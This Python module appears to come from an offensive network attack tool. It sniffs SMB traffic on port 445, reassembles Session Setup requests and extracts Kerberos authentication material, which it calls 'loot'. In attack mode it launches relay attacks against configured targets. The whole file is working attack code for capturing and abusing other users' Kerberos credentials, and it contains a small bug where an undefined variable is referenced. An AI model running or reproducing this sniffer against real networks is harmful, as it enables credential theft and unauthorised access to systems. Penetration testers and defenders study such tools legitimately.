import scapy.interfaces
from scapy.all import *
from scapy.layers import smb2, netbios
from impacket import smb3, LOG
from pyasn1.codec.der import decoder
from lib.utils.spnego import GSSAPIHeader_SPNEGO_Init, TypesMech
from impacket.spnego import ASN1_AID
from lib.utils.kerberos import get_kerberos_loot


class SMBSniffer(Thread):
    def __init__(self, config):
        Thread.__init__(self)
        self.assembly_started = False
        self.assembled_data = b''
        self.config = config

    def process_packet(self, packet):

        # Still looking for the first packet (Session setup request)
        if not self.assembly_started:
            try:
                smb_data = packet[smb2.SMB2_Header]
            except IndexError:
                return
            if smb_data.Command != 256:
                return

            # Ignore responses
            if 'SERVER_TO_REDIR' in smb_data.Flags:
                return

            # First packet found, begin assembly
            self.assembly_started = True
            self.assembled_data += bytes(packet['Raw'])
            return

        # Packet assembly started, concat the data from current packet
        try:
            self.assembled_data += bytes(packet[netbios.NBTSession])
            return
        # Once a different packet was reached, data assembly is done. Get loot.
        except IndexError:
            pass

        self.assembly_started = False
        sessionSetupData = smb3.SMB2SessionSetup(self.assembled_data)
        self.assembled_data = b''
        securityBlob = sessionSetupData['Buffer']
        try:
            aid = struct.unpack('B', securityBlob[0:1])[0]

        # Happens when assembly is triggered on wrong packet. If happened, give up the data and return.
        except struct.error:
            return
        if aid != ASN1_AID:

            # No GSSAPI stuff, we can't do anything with this
            LOG.error("Sniffer: No negTokenInit sent by client")
            return
        try:
            blob = decoder.decode(securityBlob, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
            token = blob['innerContextToken']['negTokenInit']['mechToken']

            if len(blob['innerContextToken']['negTokenInit']['mechTypes']) > 0:

                # Is this GSSAPI NTLM or something else we don't support?
                mechType = blob['innerContextToken']['negTokenInit']['mechTypes'][0]
                if (
                    str(mechType) != TypesMech['KRB5 - Kerberos 5']
                    and str(mechType) != TypesMech['MS KRB5 - Microsoft Kerberos 5']
                ):
                    LOG.error("Sniffer: Unsupported MechType '%s'" % mechStr)
                else:

                    # This is Kerberos, we can do something with this
                    try:
                        # If you're looking for the magic, it's in lib/utils/kerberos.py
                        authdata = get_kerberos_loot(securityBlob, self.config)

                        # If we are here, it was succesful

                        # Are we in attack mode? If so, launch attack against all targets
                        if self.config.mode == 'ATTACK':
                            self.do_attack(authdata)
                            # This ignores all signing stuff
                            # causes connection resets

                    # Somehow the function above catches all exceptions and hides them
                    # which is pretty annoying
                    except Exception as e:
                        import traceback

                        traceback.print_exc()
                        if type(e) == KeyboardInterrupt:
                            raise (e)
        except Exception as e:
            import traceback

            traceback.print_exc()
            if type(e) == KeyboardInterrupt:
                raise (e)

    def _start(self):
        name = scapy.interfaces.dev_from_index(self.config.sniff)
        sniff(filter='port 445', prn=self.process_packet, store=False, iface=name)

    def run(self):
        LOG.info("Setting up SMB Sniffer")
        LOG.info("USE CTRL+BREAK TO STOP (Windows)")
        self._start()
